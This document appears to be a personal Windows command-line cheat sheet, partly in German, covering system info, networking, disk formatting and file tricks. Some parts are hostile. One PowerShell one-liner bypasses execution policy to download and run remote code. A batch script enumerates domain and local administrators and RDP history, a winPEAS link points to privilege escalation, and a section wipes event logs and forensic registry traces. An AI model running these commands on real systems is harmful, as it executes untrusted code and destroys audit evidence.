# CMD

Basics

- Systeminformation: ```systeminfo```
- NIC and DNS Info: ```ipconfig -all```
- Active Connections: ```netstat –a```
- Routing table: ```route print```
- Users logged in: ```(Get-CimInstance Win32_LoggedOnUser) | Select-Object -Unique```
- Services Running: ```Msconfig```
- Firewall settings: ```netsh advfirewall show currentprofile```
- Power Config: ```powercfg /l```

## Systeminfo

Simple systeminfo.bat script

```cmd
@echo off
chcp 65001
whoami 2>&1
hostname 2>&1
echo ________________________________IpConfig______________________________ 
ipconfig /all 2>&1 
echo __________________________Domian Admins_______________________________ 
net group "domain admins" /domain 2>&1 
echo _______________________net local group members________________________ 
net localgroup administrators 2>&1 
echo ________________________________netstat_______________________________ 
netstat -an 2>&1 & 
echo _____________________________systeminfo_______________________________ 
systeminfo 2>&1 & 
echo ________________________________RDP___________________________________ 
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" 2>&1 
echo ____________________________Custom Command_______________________________ 
wmic os get Caption /value | more 2>&1 
echo ________________________________Task__________________________________ 
schtasks /query /FO List /V | findstr /b /n /c:"Repeat: Every:" 2>&1
echo ______________________________________________________________________ 
```

For are more detailed systeminfo dump run [winPEAS](https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat).

```cmd
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://gist.githubusercontent.com/AdamDimech/08ba988211b55c71a480449b3b8ab6cd/raw'))"
```

## Robocopy

exclude files

```cmd
Robocopy /xd excludethis
```

Ignore hidden files

```cmd
Robocopy -s -h
```

## Format and Image stuff

### Format FAT32 on >32GB

use diskpart to clean the disk (as Admin)

```cmd
diskpart
list disk
select disk 2
clean
create partition primary
assign
exit
```

use h2format to format the disk (64kb clusters) e.g. for drive x:

```cmd
h2format x: 64
```

## Delete logs

```cmd
del /f /q /s %windir%\prefetch\*
reg delete “HKCU\Software\Microsoft\Windows\ShellNoRoam\MUICache” /va /f
reg delete “HKLM\Software\Microsoft\Windows\ShellNoRoam\MUICache” /va /f
reg delete “HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache” /va /f
reg delete “HKLM\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache” /va /f
reg delete “HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU” /va /f
reg delete “HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist” /va /f
wmic nteventlog where LogFileName=’File Replication Service’ Call ClearEventlog
wmic nteventlog where LogFileName=’Application’ Call ClearEventlog
wmic nteventlog where LogFileName=’System’ Call ClearEventlog
wmic nteventlog where LogFileName=’PowerShell’ Call ClearEventlog
ren %1 temp000 & copy /y %windir%\regedit.exe temp000 & del temp000
```

## Mount Linux File System

List devices (choose the drive you want to mount)

```powershell
wmic diskdrive list brief
```

Mount partition 1 of "PHYSICALDRIVE3" and open it

```powershell
wsl --mount \\.\PHYSICALDRIVE3 --partition 1
wsl
cd /mnt/wsl/PHYSICALDRIVE3p1/
```

Source: <https://docs.microsoft.com/de-de/windows/wsl/wsl2-mount-disk>

## Merge Files

To hide something

```shell
copy /b secret.jpg + pic1.jpg newpic.jpg
```

To merge video files

```shell
copy /b video1.avi + video2.avi video.avi
```

## Network

**Find hidden WiFi network**

```shell
Netsh wlan show networks mode=bssid
```

**Reply from IP: TTL expired in transit**

```shell
ARP -p <IP> <MAC>
```

**Firewall config**

### Get MAC Address of remote PC

Option 1

```shell
net view machinename
nbtstat -a machinename
```

Option 2

```shell
Ping <IP/machinename>
Arp –a
```

Option 3

```shell
getmac
```

### Netzwerkverkehr umleiten

Die Addresse 8.8.8.8 mit der eigenen IP 10.155.84.186 aufrufen:

```shell
route add 8.8.8.8 MASK 255.255.255.255 10.155.84.186
route print
```

### traceroute

pathping (alternative to tracert: https://de.wikipedia.org/wiki/Pathping)

Using ICMP

```shell
traceroute -I www.microsoft.com
```

Using UDP

```shell
traceroute -U www.microsoft.com
```

Using TCP Port 80 (usually allowed by firewalls)

```shell
traceroute -T -p 80 www.microsoft.com
```

### Send Message

Anderen usern auf einem System eine Nachricht schicken:

```shell
net send /users This is a test message
msg \* /SERVER:localhost /TIME:666 /W This is a test message
```

## Benchmark Drive

```shell
Winsat disk –write –ran –ransize 262144 –drive f
```

## Create Symbolic links

```shell
fsutil hardlink create <destination_path> <file_path>
```
